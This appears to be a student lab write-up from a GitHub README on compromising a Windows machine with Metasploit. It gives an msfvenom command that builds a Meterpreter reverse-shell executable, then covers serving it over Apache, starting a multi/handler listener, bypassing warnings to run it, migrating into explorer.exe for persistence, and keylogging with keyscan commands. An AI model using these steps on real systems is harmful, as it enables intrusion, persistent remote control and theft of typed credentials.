# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

### OUTPUT:

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/2d80e84f-792a-464e-bec1-1889b94a2cbf)

Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/827c4167-8dd5-4c85-9e1d-9055c821c113)

copy the fun.exe into the apache /var/www/html folder 

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/382438be-c5da-4780-b756-e64087e939e3)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/eea3b465-5526-484b-9965-ba18231cc749)

Check the status of apache2

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/76e3a5b5-e1fb-4326-a364-f4760cbca773)

Invoke msfconsole:

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/42c9c42b-ecfe-45d6-9c09-2da05406b031)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![Screenshot 2024-05-08 222950](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/a25d360d-4ef3-440e-905c-2692d78c7bc6)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/f4fbb15f-ca2f-41ec-87d4-16934c51f3ca)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.4/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/44e8039f-7c54-4cb8-a0f2-4097a472f446)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/b7fcb83e-5797-458c-b193-0b2b8aa14ebb)

On kali give the command exploit

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/a0ed89f3-e139-4076-a88e-636cfdd2f433)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/dc36eee9-08a5-4482-86be-7f8324eabeb7)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/f592a157-172f-4382-8b80-a010700ff0cf)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump Shows the keystrokes captured so far 

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/da2ac21a-a723-462f-b98a-3b02688497a7)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
